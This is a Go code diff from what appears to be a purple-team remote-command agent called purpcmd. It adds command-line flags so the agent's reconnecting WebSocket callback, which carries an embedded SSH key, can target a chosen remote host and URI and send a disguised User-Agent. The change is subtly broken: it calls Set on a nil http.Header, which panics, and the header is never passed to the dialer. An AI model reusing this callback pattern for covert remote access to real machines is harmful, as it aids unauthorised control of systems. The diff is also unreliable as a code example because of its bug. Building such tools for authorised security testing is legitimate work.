@@ -4,7 +4,9 @@ package agent
 
 import (
 	"embed"
+	"flag"
 	"log"
+	"net/http"
 	"purpcmd/utils"
 	"time"
 
@@ -12,11 +14,23 @@ import (
 	"golang.org/x/crypto/ssh"
 )
 
-func CallWSServer(remoteAdd string, key embed.FS) {
+func CallWSServer(args []string, key embed.FS) {
+
+	flags := flag.NewFlagSet("client", flag.ContinueOnError)
+
+	var remoteAdd = flags.String("a","0.0.0.0:8080","Set remote host")
+	var uri = flags.String("uri","/","Set URI")
+	var ua = flags.String("ua","Mozilla PurpCMD","Set User-Agent")
+	//var uri = flags.String("uri","/","URI")
+	
+	flags.Usage = utils.Usage
+	flags.Parse(args)
+
+
 	var t time.Duration = 1
 	var c int = 0
 	for {
-		err := wsclient(remoteAdd, key)
+		err := wsclient(*ua, *uri, *remoteAdd, key)
 		if err != nil {
 			log.Printf("Try %d sleep for %d", c, t)
 			time.Sleep(t * time.Millisecond)
@@ -35,10 +49,13 @@ func CallWSServer(remoteAdd string, key embed.FS) {
 	}
 }
 
-func wsclient(remoteAdd string, key embed.FS) error {
-	log.Printf("Connecting to ws://%s/", remoteAdd)
+func wsclient(ua,uri, remoteAdd string, key embed.FS) error {
+	log.Printf("Connecting to ws://%s%s", remoteAdd, uri)
 
-	wclient, _, err := websocket.DefaultDialer.Dial("ws://"+remoteAdd+"/", nil)
+	var head http.Header
+	head.Set("User-Agent",ua)
+	
+	wclient, _, err := websocket.DefaultDialer.Dial("ws://"+remoteAdd+uri, nil)
 	if err != nil {
 		return err
 	}
